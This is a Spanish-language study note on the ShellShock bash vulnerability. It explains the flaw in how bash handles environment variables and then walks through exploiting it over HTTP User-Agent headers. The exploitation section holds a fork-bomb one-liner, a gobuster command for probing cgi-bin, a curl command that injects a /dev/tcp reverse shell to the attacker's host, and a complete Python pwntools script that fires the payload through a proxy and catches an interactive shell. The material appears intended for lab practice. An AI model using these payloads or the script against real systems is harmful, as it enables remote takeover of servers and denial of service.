----
- Tags: #ataques #basico #teoria #practica
----

# ¿ Que es un **ataque ShellShock** ? 

Un ataque **ShellShock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática. 

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar porgramas maliciosos, etc. 

La vulnerabilidad ShellShock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de Shell. El problema radica en la forma en que Bahs maneja las variable de entorno. Los atacantes pueden inyectar código malicoso en estas variables de entorno, las cuales Bash ejecuta sin cuestion su origin o contenido. 

Los atacantes pueden explotar estas vulnerabilidades a través de diferentes vectores de atauqe. Uno de ellos es a través del User-Agent, que es la información que el navegador web envía al servidor web para indentifcar el tipo de navegador y sistema operativo qu está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

---
# Expotación 

Para explotar un ShellShock Attack, es importante tener en cuenta que para saber si este es vulnerable, es necesario probarlo, asi como tener en cuenta que este funciona para viejas versiones de bash. 

Existen [páginas webs](https://blog.cloudflare.com/inside-shellshock/) que enseñan a explotar dicha vulnerabilidad, esto suele ser posible a traves del **User-Agent** el cual recibe como valor un payload con la sig. estructura: `() { :; }; echo; <commando_to_execute>`. Este payload es simpilar al del [Fork Bomb Attack](https://en.wikipedia.org/wiki/Fork_bomb) el cual es un ataque de denegación de servicio con la estructura de: 
```shell 
:(){:|:&};:
# O 
fork(){
	fork | fork &
}; 
fork 
```
Por lo que se podría tramitar una petición curl de la sig. manera, teniendo en cuenta que mediante *gobuster* se encontro por fuzzing la URL **cig-bin**, sabiendo que siempre que veamos una ruta como esta es importante probar un **ShellShock Attack**: 

```shell
# Es importante al descubrir un dir cgi-bin, buscar archivos con la extensión pl o sh o cgi. 
gobuster dir -u http://<ip>:<port>/cgi-bin --proxy http://<proxy_ip>:<proxy_port> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi
```

```shell
curl --proxy http://<proxy_ip>:<proxy_port> -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i &>/dev/tcp/<own_ip>/<port> 0>&1'" "http://<ip>:<port>/cgi-bin/status"
```
Así mismo, podríamos crear un script en python para entablar una consola interactiva o mismo para ejecutar comandos 

```python
#!/usr/bin/python3 

import sys, signal, requests, threading
from pwn import * 

# Ctrl + c

def ctrl_c(sig, frame): 
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars 

url = "http://192.168.1.38/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.38:3128'}
lport = 443

# Bin 

def shell_shock(): #command 

    headers = {'User-Agent':'() { :; }; echo; /bin/bash -c "/bin/bash -i &>/dev/tcp/192.168.1.35/443 0>&1"'}
    #user_agent = {'User-Agent': '() { :; }; echo; %s' % (command)} 

    r = requests.get(url, headers=headers, proxies=squid_proxy)
    #print("\n\n\t(!) Output del comando: %s" % (r.text))

if __name__ == "__main__": 
    #command = input("Ingrese un comando a ejecutar: ")
    #shell_shock(command)
    try:
        threading.Thread(target=shell_shock, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else: 
        shell.interactive()
```
La libreria **pwntools/pwn** sirve para poder entablar una consola interactiva, entre otras cosas. Mientras que la libreria **threading** para ejecutar las cosas con hilos. 

#### threading.Thread().start()   ---->  **Iniciar un nuevo hilo**
#### target=() ----> **Función a ejecutar** 
#### args=() ----> **Argumentos a pasarle a la función** 

#### listen() ----> **Ponerse en escucha a espera de una conexión** 
#### lport, timeout=20 -----> **Puerto, Tiempo de espera** 
#### .interactive() ----> **Abrir la consola en base de la conexión** 

